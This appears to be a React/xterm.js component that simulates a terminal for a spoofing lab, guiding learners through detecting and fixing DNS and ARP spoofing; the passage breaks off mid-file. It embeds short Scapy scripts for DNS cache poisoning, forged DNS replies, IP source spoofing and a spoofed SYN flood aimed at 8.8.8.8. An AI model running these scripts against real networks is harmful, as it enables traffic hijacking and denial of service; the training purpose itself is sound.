import React, { useEffect, useRef } from 'react';
import { Terminal } from '@xterm/xterm';
import { FitAddon } from '@xterm/addon-fit';
import { useLocation } from 'react-router-dom';
import '@xterm/xterm/css/xterm.css';

const XtermTerminal = () => {
  const terminalRef = useRef(null);
  const xtermRef = useRef(null);
  const location = useLocation();

  useEffect(() => {
    // Helper function to write character by character
    const writeCharByChar = async (term, text, delay = 1) => {
      const lines = text.split('\n');
      for (let i = 0; i < lines.length; i++) {
        const line = lines[i];
        for (let char of line) {
          term.write(char);
          await new Promise(resolve => setTimeout(resolve, delay));
        }
        if (i < lines.length - 1) {
          term.write('\r\n');
        }
      }
    };

    // Initialize xterm.js
    const term = new Terminal({
      cursorBlink: true,
      fontSize: 14,
      fontFamily: 'Ubuntu Mono, Consolas, monospace',
      theme: {
        background: '#2E3436',
        foreground: '#FFFFFF',
        black: '#2E3436',
        brightBlack: '#555753',
        red: '#CC0000',
        brightRed: '#EF2929',
        green: '#4E9A06',
        brightGreen: '#8AE234',
        yellow: '#C4A000',
        brightYellow: '#FCE94F',
        blue: '#3465A4',
        brightBlue: '#729FCF',
        magenta: '#75507B',
        brightMagenta: '#AD7FA8',
        cyan: '#06989A',
        brightCyan: '#34E2E2',
        white: '#D3D7CF',
        brightWhite: '#EEEEEC',
        cursor: '#FFFFFF'
      },
      allowTransparency: true,
      scrollback: 1000,
      rows: 24
    });

    const fitAddon = new FitAddon();
    term.loadAddon(fitAddon);
    
    // Mount terminal
    term.open(terminalRef.current);
    fitAddon.fit();
    xtermRef.current = term;

    // Initialize state
    let currentLine = '';
    let commandHistory = [];
    let historyIndex = 0;
    let currentDir = '/home/user';
    let grepCyberhubHostsCount = 0; // Counter for tracking grep cyberhub.com /etc/hosts command executions

    // Virtual filesystem structure
    const filesystem = {
      '/home/user': ['dns_spoofing', 'ip_spoofing'],
      '/home/user/dns_spoofing': ['dnspt1.py', 'dnspt2.py', 'dnspt3.py'],
      '/home/user/ip_spoofing': ['ipspoofpt1.py', 'ipspoofpt2.py']
    };

    // Set up welcome message and initial prompt
    const setupTerminal = async () => {
      await writeCharByChar(term, '\x1b[1;32m╔════════════════════════════════════════╗\r\n');
      await writeCharByChar(term, '║   Welcome to the Spoofing Lab Terminal   ║\r\n');
      await writeCharByChar(term, '║   Type "help" for available commands     ║\r\n');
      await writeCharByChar(term, '╚════════════════════════════════════════╝\x1b[0m\r\n');
      term.write('\x1b[1;32mroot@spoofing-lab\x1b[0m:\x1b[1;34m' + currentDir.replace('/home/user', '~') + '\x1b[0m$ ');
    };
    setupTerminal();

    // Enable paste event handling
    term.attachCustomKeyEventHandler((event) => {
      // Allow Ctrl+V for paste
      if (event.ctrlKey && event.key === 'v' && event.type === 'keydown') {
        navigator.clipboard.readText().then(text => {
          // Paste the text into the terminal
          term.write(text);
          currentLine += text;
        }).catch(err => {
          console.error('Failed to read clipboard contents: ', err);
        });
        return false; // Prevent default handling
      }
      return true; // Allow other key events to be processed
    });

    // Add context menu for right-click paste
    terminalRef.current.addEventListener('contextmenu', (e) => {
      e.preventDefault();
      navigator.clipboard.readText().then(text => {
        term.write(text);
        currentLine += text;
      }).catch(err => {
        console.error('Failed to read clipboard contents: ', err);
      });
    });

    term.onKey(async ({ key, domEvent }) => {
      // Handle Ctrl+L to clear screen
      if (domEvent.ctrlKey && key.toLowerCase() === 'l') {
        term.clear();
        term.write('\x1b[1;32mroot@spoofing-lab\x1b[0m:\x1b[1;34m' + currentDir.replace('/home/user', '~') + '\x1b[0m$ ' + currentLine);
        return;
      }
      
      // Handle Ctrl+C for copy
      if (domEvent.ctrlKey && key.toLowerCase() === 'c' && term.hasSelection()) {
        const selection = term.getSelection();
        navigator.clipboard.writeText(selection).catch(err => {
          console.error('Failed to copy text to clipboard: ', err);
        });
        return;
      }

      const printable = !domEvent.altKey && !domEvent.ctrlKey && !domEvent.metaKey;

      if (domEvent.keyCode === 13) { // Enter
        term.write('\r\n');
        if (currentLine.trim() !== '') {
          commandHistory.push(currentLine.trim());
          historyIndex = commandHistory.length;
          await handleCommand(currentLine.trim());
        } else {
          term.write('\x1b[1;32mroot@spoofing-lab\x1b[0m:\x1b[1;34m' + currentDir.replace('/home/user', '~') + '\x1b[0m$ ');
        }
        currentLine = '';
      } else if (domEvent.keyCode === 8) { // Backspace
        if (currentLine.length > 0) {
          currentLine = currentLine.slice(0, -1);
          term.write('\b \b');
        }
      } else if (domEvent.keyCode === 38) { // Up arrow
        if (historyIndex > 0) {
          while (currentLine.length > 0) {
            term.write('\b \b');
            currentLine = currentLine.slice(0, -1);
          }
          historyIndex--;
          currentLine = commandHistory[historyIndex];
          term.write(currentLine);
        }
      } else if (domEvent.keyCode === 40) { // Down arrow
        while (currentLine.length > 0) {
          term.write('\b \b');
          currentLine = currentLine.slice(0, -1);
        }
        if (historyIndex < commandHistory.length - 1) {
          historyIndex++;
          currentLine = commandHistory[historyIndex];
          term.write(currentLine);
        } else {
          historyIndex = commandHistory.length;
        }
      } else if (domEvent.keyCode === 9) { // Tab completion
        domEvent.preventDefault();
        const words = currentLine.split(' ');
        const lastWord = words[words.length - 1];
        
        const currentFiles = filesystem[currentDir] || [];
        const matches = currentFiles.filter(f => f.startsWith(lastWord));
        
        if (matches.length === 1) {
          // Clear the partial word
          for (let i = 0; i < lastWord.length; i++) {
            term.write('\b \b');
            currentLine = currentLine.slice(0, -1);
          }
          // Write the complete word
          const completion = matches[0];
          term.write(completion);
          currentLine += completion;
        }
      } else if (printable) {
        currentLine += key;
        term.write(key);
      }
    });

    // Script files definitions
    const scriptFiles = {
      'dnspt1.py': `#!/usr/bin/python3
# DNS Spoofing Script - Part 1
# Interactive DNS Spoofing Simulation

print("[SYSTEM] DNS Spoofing Simulation - Part 1/3")
print("=============================================\n")
print("=== INITIAL SYSTEM CHECK ===")
print("[PROMPT] Check your DNS resolver config:")
print("cat /etc/resolv.conf")
print("[USER INPUT] ...")`,

      'dnspt2.py': `#!/usr/bin/python3
# DNS Spoofing Script - Part 2
# DNS Response Manipulation
from scapy.all import *

def poison_cache(target_domain, spoofed_ip):
    dns_resp = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(
        qr=1, aa=1,
        qd=DNSQR(qname=target_domain),
        an=DNSRR(rrname=target_domain, ttl=3600, rdata=spoofed_ip)
    )
    send(dns_resp)
    print(f"Cache poisoned: {target_domain} -> {spoofed_ip}")

poison_cache("example.com", "192.168.1.100")`,

      'dnspt3.py': `#!/usr/bin/python3
# DNS Spoofing Script - Part 3
# Advanced DNS Cache Poisoning
from scapy.all import *

def mitm_dns(pkt):
    if DNS in pkt and pkt[DNS].qr == 0:
        spoofed_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport)/DNS(
            id=pkt[DNS].id,
            qr=1, qd=pkt[DNS].qd,
            an=DNSRR(rrname=pkt[DNS].qd.qname, rdata="192.168.1.100")
        )
        send(spoofed_resp)
        print(f"MITM response sent for: {pkt[DNS].qd.qname}")

print("Starting DNS MITM...")
sniff(filter="udp port 53", prn=mitm_dns)`,

      'ipspoofpt1.py': `#!/usr/bin/python3
# IP Spoofing Script - Part 1
# Basic IP Packet Spoofing
from scapy.all import *

def spoof_ip(target_ip):
    ip = IP(src="192.168.1.100", dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=80, flags="S")
    send(ip/tcp)
    print(f"Sent spoofed packet to {target_ip}")

spoof_ip("8.8.8.8")`,

      'ipspoofpt2.py': `#!/usr/bin/python3
# IP Spoofing Script - Part 2
# IP Flooding Attack
from scapy.all import *
import random

def flood_attack(target_ip, count=5):
    for i in range(count):
        ip = IP(src=f"192.168.{random.randint(1,254)}.{random.randint(1,254)}", dst=target_ip)
        tcp = TCP(sport=RandShort(), dport=80, flags="S")
        send(ip/tcp)
        print(f"Sent packet {i+1}/{count}")

flood_attack("8.8.8.8")`
    };

    // Handle commands
    const handleCommand = async (cmd) => {
      const args = cmd.split(' ');
      const command = args[0];

      switch (command) {
        case 'clear':
          if (args.length > 1 && args[1] === '--help') {
            await writeCharByChar(term, 'Usage: clear [OPTION]\r\n');
            await writeCharByChar(term, 'Clear the terminal screen.\r\n\r\n');
            await writeCharByChar(term, 'Options:\r\n');
            await writeCharByChar(term, '  --help     display this help and exit\r\n');
            await writeCharByChar(term, '  --history  clear command history too\r\n');
          } else if (args.length > 1 && args[1] === '--history') {
            term.clear();
            commandHistory = [];
            historyIndex = 0;
            await writeCharByChar(term, 'Terminal screen and command history cleared.\r\n');
          } else {
            term.clear();
          }
          break;

        case 'pwd':
          await writeCharByChar(term, currentDir + '\r\n');
          break;

        case 'cd':
          const newPath = args[1] || '/home/user';
          if (newPath === '..') {
            if (currentDir !== '/home/user') {
              currentDir = currentDir.split('/').slice(0, -1).join('/');
            }
          } else if (newPath === '~' || newPath === '/home/user') {
            currentDir = '/home/user';
          } else {
            const targetPath = newPath.startsWith('/')
              ? newPath
              : `${currentDir}/${newPath}`;
            
            if (filesystem[targetPath]) {
              currentDir = targetPath;
            } else {
              await writeCharByChar(term, `cd: no such directory: ${newPath}\r\n`);
            }
          }
          break;

        case 'ls':
          const dirContents = filesystem[currentDir] || [];
          if (dirContents.length > 0) {
            // Color directories blue, files white
            const coloredFiles = dirContents.map(file => {
              return filesystem[`${currentDir}/${file}`]
                ? `\x1b[1;34m${file}\x1b[0m`
                : file;
            });
            await writeCharByChar(term, coloredFiles.join('  ') + '\r\n');
            if (currentDir.includes('dns_spoofing') || currentDir.includes('ip_spoofing')) {
              await writeCharByChar(term, 'Type "cat <filename>" to view a script\r\n');
              await writeCharByChar(term, 'Type "python3 <filename>" to run a script\r\n');
            }
          } else {
            await writeCharByChar(term, '.\r\n..\r\n');
          }
          break;

        case 'cat':
          const file = args[1];
          if (!file) {
            await writeCharByChar(term, 'Usage: cat <filename>\r\n');
            break;
          }

          if (file === '/etc/resolv.conf') {
            await writeCharByChar(term, 'nameserver 127.0.0.53\r\n');
            await writeCharByChar(term, 'options edns0 trust-ad\r\n');
            await writeCharByChar(term, 'search localdomain\r\n');
            await writeCharByChar(term, '\r\n[EXPLANATION]\r\n');
            await writeCharByChar(term, '• Your system uses 127.0.0.53 (systemd-resolved)\r\n');
            await writeCharByChar(term, '• Actual resolvers are configured elsewhere\r\n\r\n');
            await writeCharByChar(term, '=== DNS RESOLUTION CHECK ===\r\n');
            await writeCharByChar(term, '[PROMPT] Check how cyberhub.com resolves:\r\n');
            await writeCharByChar(term, 'nslookup cyberhub.com\r\n');
            await writeCharByChar(term, '[USER INPUT] ...\r\n');
            break;
          } else if (file === '/etc/hosts') {
            // Check if hosts file has been edited
            const hostsEdited = commandHistory.some(cmd => cmd.includes('sudo tee -a /etc/hosts'));
            
            if (hostsEdited) {
              await writeCharByChar(term, '127.0.0.1       localhost\r\n');
              await writeCharByChar(term, '127.0.1.1       spoofing-lab\r\n');
              await writeCharByChar(term, '172.67.182.31   cyberhub.com\r\n\r\n');
              await writeCharByChar(term, '# The following lines are desirable for IPv6 capable hosts\r\n');
              await writeCharByChar(term, '::1             localhost ip6-localhost ip6-loopback\r\n');
              await writeCharByChar(term, 'ff02::1         ip6-allnodes\r\n');
              await writeCharByChar(term, 'ff02::2         ip6-allrouters\r\n');
            } else {
              await writeCharByChar(term, '127.0.0.1       localhost\r\n');
              await writeCharByChar(term, '127.0.1.1       spoofing-lab\r\n');
              await writeCharByChar(term, '185.143.223.107 cyberhub.com\r\n\r\n');
              await writeCharByChar(term, '# The following lines are desirable for IPv6 capable hosts\r\n');
              await writeCharByChar(term, '::1             localhost ip6-localhost ip6-loopback\r\n');
              await writeCharByChar(term, 'ff02::1         ip6-allnodes\r\n');
              await writeCharByChar(term, 'ff02::2         ip6-allrouters\r\n');
            }
            break;
          } else {
            await writeCharByChar(term, `cat: ${file}: No such file or directory\r\n`);
            break;
          }
          
        case 'dig':
          if (args.length === 2 && args[1] === '@8.8.8.8') {
            await writeCharByChar(term, 'cyberhub.com.   300     IN      A       172.67.182.31\r\n');
            await writeCharByChar(term, '[EXPLANATION]\r\n');
            await writeCharByChar(term, '✅ Trusted DNS shows correct IP: 172.67.182.31\r\n');
            await writeCharByChar(term, 'Your local resolution shows: 185.143.223.107\r\n');
            await writeCharByChar(term, 'This confirms DNS spoofing is occurring!\r\n\r\n');
            await writeCharByChar(term, '=== HOSTS FILE INSPECTION ===\r\n');
            await writeCharByChar(term, '[PROMPT] Check for tampering:\r\n');
            await writeCharByChar(term, 'grep cyberhub.com /etc/hosts\r\n');
            await writeCharByChar(term, '[USER INPUT]\r\n');
          } else if (args.length === 3 && args[1] === '@8.8.8.8' && args[2] === 'cyberhub.com') {
            await writeCharByChar(term, 'cyberhub.com.   300     IN      A       172.67.182.31\r\n');
            await writeCharByChar(term, '[EXPLANATION]\r\n');
            await writeCharByChar(term, '✅ Trusted DNS shows correct IP: 172.67.182.31\r\n');
            await writeCharByChar(term, 'Your local resolution shows: 185.143.223.107\r\n');
            await writeCharByChar(term, 'This confirms DNS spoofing is occurring!\r\n\r\n');
            await writeCharByChar(term, '=== HOSTS FILE INSPECTION ===\r\n');
            await writeCharByChar(term, '[PROMPT] Check for tampering:\r\n');
            await writeCharByChar(term, 'grep cyberhub.com /etc/hosts\r\n');
            await writeCharByChar(term, '[USER INPUT]\r\n');
          } else {
            await writeCharByChar(term, `dig: invalid usage or unsupported command\r\n`);
          }
          break;

        case 'grep':
          // Check for grep cyberhub.com /etc/hosts command with or without quotes
          const isCyberhubGrep = (
            (args.length === 3 && args[1] === 'cyberhub.com' && args[2] === '/etc/hosts') ||
            (args.length === 3 && args[1].replace(/['"]/g, '') === 'cyberhub.com' && args[2] === '/etc/hosts')
          );
          
          if (isCyberhubGrep) {
            if (grepCyberhubHostsCount === 0) {
              // First execution
              await writeCharByChar(term, '185.143.223.107 cyberhub.com\r\n');
              await writeCharByChar(term, '[EXPLANATION]\r\n');
              await writeCharByChar(term, '🔍 Malicious entry found!\r\n');
              await writeCharByChar(term, '• cyberhub.com is hardcoded to 185.143.223.107\r\n');
              await writeCharByChar(term, 'This overrides all DNS resolutions for this domain\r\n\r\n');
              await writeCharByChar(term, '[SYSTEM] Run Part 3 to fix the issue...\r\n');
              await writeCharByChar(term, '\r\n');  // Add extra newline to ensure output is visible
              grepCyberhubHostsCount++; // Increment counter for next time
            } else {
              // Second execution
              await writeCharByChar(term, '172.67.182.31   cyberhub.com\r\n');
              await writeCharByChar(term, '[EXPLANATION]\r\n');
              await writeCharByChar(term, '✅ Confirmed: cyberhub.com now correctly points to 172.67.182.31\r\n\r\n');
              await writeCharByChar(term, '=== STEP 3: FLUSH DNS CACHE ===\r\n');
              await writeCharByChar(term, '[PROMPT] Clear poisoned DNS cache:\r\n');
            }
          } else if (cmd.includes('cyberhub.com') && cmd.includes('/etc/hosts') && cmd.includes('||')) {
            // This handles the verification command after the malicious entry has been removed
            await writeCharByChar(term, 'No entries found\r\n');
            await writeCharByChar(term, '[EXPLANATION]\r\n');
            await writeCharByChar(term, '✅ Confirmed: No malicious entries remain in /etc/hosts\r\n\r\n');
            await writeCharByChar(term, '=== STEP 2: RESTORE LEGITIMATE IP ===\r\n');
            await writeCharByChar(term, '[PROMPT] Add the correct mapping:\r\n');
            await writeCharByChar(term, 'echo \'172.67.182.31 cyberhub.com\' | sudo tee -a /etc/hosts\r\n');
            await writeCharByChar(term, '[USER INPUT]\r\n');
          } else {
            await writeCharByChar(term, `grep: invalid usage or unsupported command\r\n`);
          }
          break;
          
        case 'sudo':
          if (cmd.includes('tcpdump -i eth0')) {
            await writeCharByChar(term, '10:00:01.123 ARP, Reply 192.168.1.1 is-at 00:aa:bb:cc:dd:ee\r\n');
            await writeCharByChar(term, '10:00:01.124 ARP, Request who-has 192.168.1.1 tell 192.168.1.100\r\n');
            await writeCharByChar(term, '10:00:01.125 ARP, Reply 192.168.1.1 is-at 00:aa:bb:cc:dd:ee\r\n');
            await writeCharByChar(term, '5 packets captured\r\n');
            await writeCharByChar(term, '[EXPLANATION]\r\n');
            await writeCharByChar(term, '🎯 Forensic Evidence Found!\r\n');
            await writeCharByChar(term, '• Attacker is spoofing 192.168.1.1\r\n');
            await writeCharByChar(term, '• Fake MAC: 00:aa:bb:cc:dd:ee\r\n');
            await writeCharByChar(term, '• This enables man-in-the-middle attacks\r\n\r\n');
            await writeCharByChar(term, '=== PHASE 4: ATTACK MITIGATION ===\r\n');
            await writeCharByChar(term, '[PROMPT] 1. Clear poisoned ARP entry:\r\n');
            await writeCharByChar(term, 'sudo arp -d 192.168.1.1\r\n');
            await writeCharByChar(term, '[RUN COMMAND]\r\n');
          } else if (cmd.includes('arp -d 192.168.1.1')) {
            await writeCharByChar(term, '✓ Removed malicious ARP entry\r\n');
            await writeCharByChar(term, '[PROMPT] \r\n');
            await writeCharByChar(term, '2. Add static ARP entry:\r\n');
            await writeCharByChar(term, 'sudo arp -s 192.168.1.1 00:1a:2b:3c:4d:5e\r\n');
            await writeCharByChar(term, '[RUN COMMAND]\r\n');
          } else if (cmd.includes('arp -s 192.168.1.1')) {
            await writeCharByChar(term, '✓ Added permanent ARP entry\r\n');
            await writeCharByChar(term, '[PROMPT] \r\n');
            await writeCharByChar(term, '3. Verify ARP table: arp -a\r\n');
            await writeCharByChar(term, '[RUN COMMAND]\r\n');
          } else if (cmd.includes("sed -i '/cyberhub.com/d' /etc/hosts")) {
            await writeCharByChar(term, '✓ Malicious entry removed\r\n');
            await writeCharByChar(term, '[PROMPT] Verify the removal by checking /etc/hosts:\r\n');
            await writeCharByChar(term, "grep 'cyberhub.com' /etc/hosts || echo 'No entries found'\r\n");
            await writeCharByChar(term, '[RUN VERIFICATION]\r\n');
          } else if (cmd.includes("systemd-resolve --flush-caches")) {
            await writeCharByChar(term, '✓ DNS cache flushed\r\n');
            await writeCharByChar(term, '[PROMPT] Verify resolution is now correct: nslookup cyberhub.com\r\n');
            await writeCharByChar(term, '[RUN VERIFICATION]\r\n');
          } else {
            await writeCharByChar(term, `sudo: command not found or insufficient privileges\r\n`);
          }
          break;

        case 'echo':
          if (cmd.includes('172.67.182.31 cyberhub.com') && cmd.includes('sudo tee -a /etc/hosts')) {
            await writeCharByChar(term, '172.67.182.31 cyberhub.com\r\n');
            await writeCharByChar(term, '✓ Legitimate IP added\r\n');
            await writeCharByChar(term, '[PROMPT] Confirm the new entry exists:\r\n');
            await writeCharByChar(term, "grep 'cyberhub.com' /etc/hosts\r\n");
            await writeCharByChar(term, '[RUN VERIFICATION]\r\n');
          } else {
            await writeCharByChar(term, `${cmd}\r\n`);
          }
          break;

        case 'python3':
          const scriptFile = args[1];
          if (!scriptFile) {
            await writeCharByChar(term, 'Usage: python3 <filename>\r\n');
            break;
          }

          let waitingForInput = false;
          let currentPrompt = '';

          if (currentDir.includes('dns_spoofing')) {
            switch (scriptFile) {
              case 'dnspt1.py':
                await writeCharByChar(term, '[SYSTEM] DNS Spoofing Simulation - Part 1/3\r\n');
                await writeCharByChar(term, '=============================================\r\n\r\n');
                await writeCharByChar(term, '=== INITIAL SYSTEM CHECK ===\r\n');
                await writeCharByChar(term, '[PROMPT] Check your DNS resolver config:\r\n');
                await writeCharByChar(term, 'cat /etc/resolv.conf\r\n');
                await writeCharByChar(term, '[USER INPUT] ');
                waitingForInput = true;
                currentPrompt = 'cat /etc/resolv.conf';
                let currentStep = 1;
                break;
              case 'dnspt2.py':
                await writeCharByChar(term, '[SYSTEM] DNS Spoofing Simulation - Part 2/3\r\n');
                await writeCharByChar(term, '=============================================\r\n\r\n');
                await writeCharByChar(term, '=== VERIFY WITH KNOWN GOOD DNS ===\r\n');
                await writeCharByChar(term, '[PROMPT] Cross-check cyberhub.com with Google DNS:\r\n');
                await writeCharByChar(term, 'dig @8.8.8.8 cyberhub.com\r\n');
                await writeCharByChar(term, '[USER INPUT] ');
                waitingForInput = true;
                currentPrompt = 'dig @8.8.8.8 cyberhub.com';
                break;
              case 'dnspt3.py':
                await writeCharByChar(term, '[SYSTEM] DNS Spoofing Remediation - Part 3/3\r\n');
                await writeCharByChar(term, '===============================================\r\n\r\n');
                await writeCharByChar(term, '=== STEP 1: REMOVE MALICIOUS ENTRY ===\r\n');
                await writeCharByChar(term, '[PROMPT] Execute this command to remove the malicious entry:\r\n');
                await writeCharByChar(term, 'sudo sed -i \'/cyberhub.com/d\' /etc/hosts\r\n');
                await writeCharByChar(term, '[USER INPUT] ');
                waitingForInput = true;
                currentPrompt = 'sudo sed -i \'/cyberhub.com/d\' /etc/hosts';
                break;
              default:
                await writeCharByChar(term, `python3: can't open file '${scriptFile}': No such file\r\n`);
            }
          } else if (currentDir.includes('ip_spoofing')) {
            switch (scriptFile) {
              case 'ipspoofpt1.py':
                await writeCharByChar(term, '[SYSTEM] IP Spoofing Detection - Part 1/2\r\n');
                await writeCharByChar(term, '=========================================\r\n\r\n');
                await writeCharByChar(term, '=== PHASE 1: NETWORK RECONNAISSANCE ===\r\n');
                await writeCharByChar(term, '[PROMPT] Check your IP configuration:\r\n');
                await writeCharByChar(term, 'ip a\r\n');
                await writeCharByChar(term, '[RUN COMMAND]\r\n');
                break;
              case 'ipspoofpt2.py':
                await writeCharByChar(term, '[SYSTEM] IP Spoofing Forensic Analysis & Mitigation - Part 2/2\r\n');
                await writeCharByChar(term, '============================================================\r\n\r\n');
                await writeCharByChar(term, '=== PHASE 3: NETWORK FORENSICS ===\r\n');
                await writeCharByChar(term, '[PROMPT] 1. Test gateway connectivity:\r\n');
                await writeCharByChar(term, 'ping -c 3 192.168.1.1\r\n');
                await writeCharByChar(term, '[RUN COMMAND]\r\n');
                break;
              default:
                await writeCharByChar(term, `python3: can't open file '${scriptFile}': No such file\r\n`);
            }
          }
          break;

        case 'curl':
          if (cmd.includes('-Is https://cyberhub.com') && cmd.includes('head -n 1')) {
            await writeCharByChar(term, 'HTTP/2 200 OK\r\n');
            await writeCharByChar(term, '[EXPLANATION]\r\n');
            await writeCharByChar(term, '🎉 Fully restored! Website responds correctly\r\n\r\n');
            await writeCharByChar(term, '[SYSTEM] All steps completed successfully!\r\n');
            await writeCharByChar(term, 'Lessons learned:\r\n');
            await writeCharByChar(term, '- Always verify DNS changes with multiple tools\r\n');
            await writeCharByChar(term, '- Consider using DNSSEC for stronger protection\r\n');
            await writeCharByChar(term, '- Monitor critical system files like /etc/hosts\r\n');
          } else {
            await writeCharByChar(term, `curl: command executed with unrecognized parameters\r\n`);
          }
          break;

        case 'nslookup':
          const domain = args[1];
          if (!domain) {
            await writeCharByChar(term, 'Usage: nslookup <domain>\r\n');
            break;
          }
          
          // Check if DNS cache has been flushed
          const dnsFixed = commandHistory.some(cmd => cmd.includes('systemd-resolve --flush-caches'));
          
          if (domain === 'cyberhub.com') {
            await writeCharByChar(term, 'Server:         127.0.0.53\r\n');
            await writeCharByChar(term, 'Address:        127.0.0.53#53\r\n\r\n');
            
            if (dnsFixed) {
              // Show correct IP after DNS cache flush
              await writeCharByChar(term, 'Name:   cyberhub.com\r\n');
              await writeCharByChar(term, 'Address: 172.67.182.31\r\n');
              await writeCharByChar(term, '[EXPLANATION]\r\n');
              await writeCharByChar(term, '✅ DNS resolution is now correct!\r\n\r\n');
              await writeCharByChar(term, '=== FINAL VALIDATION ===\r\n');
              await writeCharByChar(term, '[PROMPT] Confirm full functionality:\r\n');
              await writeCharByChar(term, 'curl -Is https://cyberhub.com | head -n 1\r\n');
              await writeCharByChar(term, '[RUN VERIFICATION]\r\n');
            } else {
              // Show malicious IP before DNS cache flush
              await writeCharByChar(term, 'Non-authoritative answer:\r\n');
              await writeCharByChar(term, 'Name:   cyberhub.com\r\n');
              await writeCharByChar(term, 'Address: 185.143.223.107\r\n\r\n');
              await writeCharByChar(term, '[EXPLANATION]\r\n');
              await writeCharByChar(term, '⚠️ Suspicious: Resolves to 185.143.223.107\r\n');
              await writeCharByChar(term, 'Expected IP: 172.67.182.31\r\n');
              await writeCharByChar(term, 'Possible DNS spoofing!\r\n');
            }
          } else {
            await writeCharByChar(term, `Server:         127.0.0.53\r\n`);
            await writeCharByChar(term, `Address:        127.0.0.53#53\r\n\r\n`);
            await writeCharByChar(term, `** server can't find ${domain}: NXDOMAIN\r\n`);
          }
          break;

        case 'ping':
          if (args[1] === '-c' && args[2] === '3') {
            if (args[3] === '192.168.1.100') {
              await writeCharByChar(term, '[RUN COMMAND] $ ping -c 3 192.168.1.100\r\n');
              await writeCharByChar(term, 'From 192.168.1.105 icmp_seq=1 Destination Host Unreachable\r\n');
              await writeCharByChar(term, 'From 192.168.1.105 icmp_seq=2 Destination Host Unreachable\r\n');
              await writeCharByChar(term, '--- 192.168.1.100 ping statistics ---\r\n');
              await writeCharByChar(term, '3 packets transmitted, 0 received, 100% packet loss\r\n');
              await writeCharByChar(term, '[EXPLANATION]\r\n');
              await writeCharByChar(term, '⚠️ Connection issues may indicate ARP spoofing\r\n');
              await writeCharByChar(term, '[PROMPT] \r\n');
              await writeCharByChar(term, 'Inspect ARP table:\r\n');
              await writeCharByChar(term, 'arp -a\r\n');
              await writeCharByChar(term, '[RUN COMMAND]\r\n');
            } else if (args[3] === '192.168.1.1') {
              // Check if ARP has been fixed
              const arpFixed = commandHistory.some(cmd => cmd.includes('sudo arp -s 192.168.1.1'));
              
              if (arpFixed) {
                await writeCharByChar(term, '64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=1.23 ms\r\n');
                await writeCharByChar(term, '--- 192.168.1.1 ping statistics ---\r\n');
                await writeCharByChar(term, '3 packets transmitted, 3 received, 0% packet loss\r\n');
                await writeCharByChar(term, '[EXPLANATION]\r\n');
                await writeCharByChar(term, '🎉 Network Fully Restored!\r\n');
                await writeCharByChar(term, 'All systems functioning normally\r\n');
              } else {
                await writeCharByChar(term, 'From 192.168.1.105 icmp_seq=1 Destination Host Unreachable\r\n');
                await writeCharByChar(term, '--- 192.168.1.1 ping statistics ---\r\n');
                await writeCharByChar(term, '3 packets transmitted, 0 received, 100% packet loss\r\n');
                await writeCharByChar(term, '[EXPLANATION]\r\n');
                await writeCharByChar(term, '⚠️ Gateway unreachable - consistent with ARP spoofing\r\n');
                await writeCharByChar(term, '[PROMPT] \r\n');
                await writeCharByChar(term, '2. Capture ARP traffic:\r\n');
                await writeCharByChar(term, 'sudo tcpdump -i eth0 -n \'arp\' -c 5\r\n');
                await writeCharByChar(term, '[RUN COMMAND]\r\n');
              }
            }
          } else {
            await writeCharByChar(term, `PING ${args[3] || 'unknown'} failed\r\n`);
          }
          break;

        case 'ifconfig':
          await writeCharByChar(term, 'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\r\n');
          await writeCharByChar(term, '        inet 192.168.1.100  netmask 255.255.255.0  broadcast 192.168.1.255\r\n');
          await writeCharByChar(term, '        inet6 fe80::216:3eff:fe74:5555  prefixlen 64  scopeid 0x20<link>\r\n');
          await writeCharByChar(term, '        ether 00:16:3e:74:55:55  txqueuelen 1000  (Ethernet)\r\n');
          await writeCharByChar(term, '        RX packets 8257  bytes 1795622 (1.7 MB)\r\n');
          await writeCharByChar(term, '        RX errors 0  dropped 0  overruns 0  frame 0\r\n');
          await writeCharByChar(term, '        TX packets 8183  bytes 1070284 (1.0 MB)\r\n');
          await writeCharByChar(term, '        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\r\n\r\n');
          
          await writeCharByChar(term, 'lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\r\n');
          await writeCharByChar(term, '        inet 127.0.0.1  netmask 255.0.0.0\r\n');
          await writeCharByChar(term, '        inet6 ::1  prefixlen 128  scopeid 0x10<host>\r\n');
          await writeCharByChar(term, '        loop  txqueuelen 1000  (Local Loopback)\r\n');
          await writeCharByChar(term, '        RX packets 123  bytes 10976 (10.9 KB)\r\n');
          await writeCharByChar(term, '        RX errors 0  dropped 0  overruns 0  frame 0\r\n');
          await writeCharByChar(term, '        TX packets 123  bytes 10976 (10.9 KB)\r\n');
          await writeCharByChar(term, '        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\r\n');
          break;
          
        case 'ip':
          if (args[1] === 'a') {
            await writeCharByChar(term, '2: eth0: <BROADCAST> mtu 1500\r\n');
            await writeCharByChar(term, '    inet 192.168.1.105/24\r\n');
            await writeCharByChar(term, '[PROMPT] \r\n');
            await writeCharByChar(term, 'Check routing table:\r\n');
            await writeCharByChar(term, 'ip route\r\n');
            await writeCharByChar(term, '[RUN COMMAND]\r\n');
          } else if (args[1] === 'route') {
            await writeCharByChar(term, 'default via 192.168.1.1 dev eth0\r\n');
            await writeCharByChar(term, '[EXPLANATION]\r\n');
            await writeCharByChar(term, '🔍 Network reconnaissance complete\r\n');
            await writeCharByChar(term, 'Next we\'ll check for ARP spoofing indicators\r\n\r\n');
            await writeCharByChar(term, '=== PHASE 2: ARP SPOOFING DETECTION ===\r\n');
            await writeCharByChar(term, '[PROMPT] Test server connectivity:\r\n');
            await writeCharByChar(term, 'ping -c 3 192.168.1.100\r\n');
            await writeCharByChar(term, '[RUN COMMAND]\r\n');
          }
          break;

        case 'netstat':
          await writeCharByChar(term, 'Active Internet connections (w/o servers)\r\n');
          await writeCharByChar(term, 'Proto Recv-Q Send-Q Local Address           Foreign Address         State\r\n');
          await writeCharByChar(term, 'tcp        0      0 192.168.1.100:35122     172.67.182.31:443       ESTABLISHED\r\n');
          await writeCharByChar(term, 'tcp        0      0 192.168.1.100:37648     151.101.1.195:443       ESTABLISHED\r\n');
          await writeCharByChar(term, 'tcp        0      0 192.168.1.100:47564     140.82.121.4:443        ESTABLISHED\r\n');
          await writeCharByChar(term, 'tcp6       0      0 ::1:38864               ::1:631                 ESTABLISHED\r\n');
          await writeCharByChar(term, '\r\n');
